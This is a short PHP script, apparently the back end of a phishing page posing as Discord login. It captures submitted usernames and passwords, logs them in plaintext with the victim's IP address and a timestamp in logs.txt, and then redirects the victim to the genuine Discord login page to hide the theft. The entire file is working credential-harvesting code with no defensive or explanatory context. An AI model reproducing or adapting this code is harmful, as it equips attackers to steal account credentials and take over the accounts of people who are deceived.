<?php
$username = $_POST['username'] ?? 'yok';
$password = $_POST['password'] ?? 'yok';
$ip = $_SERVER['REMOTE_ADDR'];
$time = date('Y-m-d H:i:s');
$entry = "[$time] IP:$ip | Kullanici:$username | Sifre:$password\n";
file_put_contents('logs.txt', $entry, FILE_APPEND);
header('Location: https://discord.com/login');
?>
